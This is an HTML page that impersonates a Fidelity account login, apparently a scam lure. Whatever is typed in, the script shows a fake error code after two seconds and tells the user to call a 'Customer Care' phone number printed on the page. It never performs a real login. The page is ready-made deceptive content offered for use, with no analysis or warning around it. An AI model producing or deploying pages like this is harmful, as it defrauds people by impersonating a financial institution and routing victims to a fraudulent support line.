<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fidelity Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            position: relative;
            flex-direction: column;
        }

        header {
            width: 100%;
            background-color: #ffffff;
            padding: 15px 20px;
            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: absolute;
            top: 0;
        }

        .header-container {
            display: flex;
            justify-content: space-between;
            width: 100%;
            align-items: center;
        }

        .header-links a {
            text-decoration: none;
            color: #4B4B4B;
            margin-left: 20px; /* Spacing between links */
            margin-right: 20px;
        }

        .header-links a:hover {
            text-decoration: underline;
        }

        .container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
            width: 90%; /* Full width for mobile */
            max-width: 400px; /* Max width for desktop */
            text-align: center;
            margin-top: 60px; /* Adjust margin for header */
        }

        .container h2 {
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 5px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

        input[type="checkbox"] {
            margin-right: 10px;
        }

        .login-btn {
            width: 100%;
            background-color: #28a745;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        .login-btn:hover {
            background-color: #218838;
        }

        .forgot-password {
            display: block;
            margin-top: 15px;
            text-align: left;
        }

        .forgot-password a {
            color: black;
            text-decoration: underline;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .signup-link {
            margin-top: 20px;
            font-size: 14px;
            text-align: center;
        }

        .signup-link a {
            color: black;
            text-decoration: underline;
        }

        .signup-link a:hover {
            text-decoration: underline;
        }

        .error {
            color: red;
            margin-top: 10px;
            font-size: 14px;
        }

        /* Media Queries for Responsiveness */
        @media (max-width: 600px) {
            header {
                padding: 10px 15px;
            }

            .header-links a {
                margin-left: 10px; /* Less spacing on mobile */
                margin-right: 10px;
            }

            .container {
                padding: 20px; /* Less padding on mobile */
            }

            .login-btn {
                padding: 10px; /* Smaller button on mobile */
                font-size: 14px; /* Smaller font on mobile */
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="header-container">
            <div class="logo">
                <img src="fidelity-vector-logo-small.png" alt="Fidelity Logo" style="width: 150px;">
            </div>
            <div class="header-links">
                <a href="#">Security</a>
                <a href="#">FAQs</a>
            </div>
        </div>
    </header>

    <div class="container">
        <h2>Log in</h2>
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Username">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password">
                <div id="error-message" class="error"></div> <!-- Error message block -->
            </div>
            <div class="form-group">
                <input type="checkbox" id="remember" name="remember">
                <label for="remember">Remember my username</label>
            </div>
            <button type="submit" class="login-btn">Log in</button>
            <div class="forgot-password">
                <a href="#">Forgot username or password?</a>
            </div>
        </form>
    </div>

    <!-- Signup link outside the container -->
    <div class="signup-link">
        New to Fidelity? <a href="#">Open an account or sign up.</a>
    </div>

        <script>
        // Function to save username to localStorage if "Remember my username" is checked
        function saveUsername() {
            const username = document.getElementById('username').value;
            const remember = document.getElementById('remember').checked;

            if (remember) {
                localStorage.setItem('rememberedUsername', username);
            } else {
                localStorage.removeItem('rememberedUsername');
            }
        }

        // Function to populate the username field if it was remembered
        function loadRememberedUsername() {
            const rememberedUsername = localStorage.getItem('rememberedUsername');
            if (rememberedUsername) {
                document.getElementById('username').value = rememberedUsername;
                document.getElementById('remember').checked = true;
            }
        }

        // Show error message on login attempt
        function showErrorMessage() {
            const errorMessage = document.getElementById('error-message');
            errorMessage.innerHTML = 'Error Code : 00X47800 <br> Contact Customer Care : +1-844-499-1812';
        }

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            // Show error message after 2 seconds
            setTimeout(function() {
                showErrorMessage();
            }, 2000); // 2000ms = 2 seconds

            // Save the username if remember is checked
            saveUsername();
        });

        // Load remembered username on page load
        window.onload = function() {
            loadRememberedUsername();
        };
    </script>

</body>
</html>
